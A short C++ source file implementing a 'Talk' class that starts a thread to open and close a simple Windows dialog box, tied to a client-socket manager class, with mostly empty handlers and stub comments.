// Talk.cpp: implementation of the Talk class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Talk.h"
#include "resource.h"
#include "Common.h"



extern HINSTANCE g_hInstance;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

Talk::Talk(CClientSocket *pClient):CManager(pClient) 
{




	 MyCreateThread(NULL, 0, 
			(LPTHREAD_START_ROUTINE)CreateTalkDialog,(LPVOID)this, 0, NULL);



}



DWORD WINAPI Talk::CreateTalkDialog(LPVOID lparam)
{

		DialogBox(g_hInstance,MAKEINTRESOURCE(IDD_DIALOG),NULL,DialogProc);


		return 0;
}


int CALLBACK Talk::DialogProc(HWND hDlg,unsigned int uMsg,WPARAM wParam,LPARAM lParam)
{

	//P2P   WSAAy

	switch(uMsg)
	{

	case WM_INITDIALOG:
		{


			break;
		}
	case WM_CLOSE:
		{
			EndDialog(hDlg,0);

			break;
		}

		//setdilgtext
	}


	return 0;
}


Talk::~Talk()
{

}
